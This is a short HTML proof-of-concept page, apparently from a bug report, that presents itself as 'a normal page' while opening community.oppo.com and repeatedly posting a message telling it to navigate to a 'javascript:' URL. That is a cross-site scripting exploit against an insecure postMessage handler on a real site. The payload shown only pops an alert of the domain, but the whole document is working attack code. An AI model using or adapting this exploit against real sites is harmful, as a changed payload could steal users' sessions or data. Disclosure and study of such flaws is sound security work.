<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>Postmessage PoC</title>
  </head>
  <body>
    <h1>Hi this is a normal page !</h1>
    <script>
      window.onload = function () {

        let win = window.open("https://community.oppo.com/");
        let msg =  {action:"location",type:"self",url:"javascript:alert(document.domain)"}

   

        setInterval(function () {
          win.postMessage(msg, "*");
        }, 2000);
      };
    </script>
  </body>
</html>
